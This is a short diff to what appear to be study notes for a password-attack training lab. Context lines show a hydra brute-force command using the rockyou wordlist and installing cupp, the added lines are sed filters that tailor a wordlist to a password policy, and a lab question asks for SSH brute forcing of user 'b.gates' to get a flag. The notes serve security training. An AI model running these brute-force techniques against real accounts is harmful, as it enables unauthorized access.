@@ -31,6 +31,12 @@ hydra -l admin -P /usr/share/wordlists/rockyou.txt -f 83.136.253.106 -s 55305 ht
 ```bash
 sudo apt install cupp
 ```
+```
+Code: bash
+sed -ri '/^.{,7}$/d' william.txt            # remove shorter than 8
+sed -ri '/[!-/:-@\[-`\{-~]+/!d' william.txt # remove no special chars
+sed -ri '/[0-9]+/!d' william.txt            # remove no numbers
+```
 
 >**Q. Using what you learned in this section, try to brute force the SSH login of the user "b.gates" in the target server shown above. Then try to SSH into the server. You should find a flag in the home dir. What is the content of the flag?**
 
